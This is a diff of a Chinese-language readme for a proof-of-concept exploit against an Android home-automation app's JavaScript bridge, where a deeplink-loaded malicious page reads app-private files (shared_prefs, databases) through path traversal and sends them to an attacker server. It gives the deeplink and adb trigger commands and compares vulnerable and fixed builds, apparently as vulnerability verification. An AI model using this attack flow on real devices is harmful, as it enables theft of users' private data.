@@ -7,37 +7,22 @@ HomeAppBridge 的 `readMediaFile(fileName)` 方法直接使用 `File(baseDir, fi
 ## 触发方式
 
 ```
-homeassistant://webview?url=http://10.0.2.2:8000/exp/1.2
+homeassistant://webview?url=http://<HOST_IP>:8000/exp/1.2
 ```
 
-## 启动服务
-
-```bash
-cd exp/home-assistant/1.2_Insecure_JavaScript_Bridge_Implementation
-python server.py
-```
-
-## 文件结构
-
-```
-1.2_Insecure_JavaScript_Bridge_Implementation/
-├── server.py          # 攻击服务器（HTTP :8000）
-├── exp/
-│   └── 1.2.html       # 恶意页面（伪装为"安防回放"）
-├── received/          # 回收的数据（自动生成）
-└── readme.md          # 本文件
-```
+> `<HOST_IP>` 用 `server.py` 启动时显示的 IP 替换。MuMu 模拟器使用宿主机 LAN IP。
 
 ## 验证步骤
 
-1. 启动服务器: `python server.py`
-2. 在模拟器中通过 adb 触发 Deeplink:
+1. 清空旧数据: `rm -rf received/*`
+2. 启动服务器: `python server.py`
+3. ADB 触发:
    ```
-   adb -s 127.0.0.1:7555 shell am start -a android.intent.action.VIEW -d "homeassistant://webview?url=http://10.0.2.2:8000/exp/1.2"
+   adb -s 127.0.0.1:7555 shell am start -a android.intent.action.VIEW -d "homeassistant://webview?url=http://<HOST_IP>:8000/exp/1.2"
    ```
-3. 观察 `received/` 目录下生成的回收数据文件
-4. 检查是否成功读取到 App 私有文件内容（如 `shared_prefs/xxx.xml`）
+4. 等待 3-5 秒后检查 `received/` 目录
 
 ## 预期结果
 
-正常读取 `snapshots/driveway_20260529_080000.jpg` 的同时，也能通过路径穿梭读取到 App 其他目录下的私有文件。
+- **Vuln APK**: 路径穿梭成功，`received/` 中出现 `pathTraversal_0`, `pathTraversal_1`, `pathTraversal_2` 数据，包含 `shared_prefs/`、`databases/` 等目录下的私有文件内容
+- **Fix APK**: `received/` 为空或只有空数据。路径穿梭被 `readMediaFile` 中的 `..` 检查和 `canonicalPath` 校验阻止，且 `HomeAppBridge` 仅对 `home-assistant.io` 域名注册
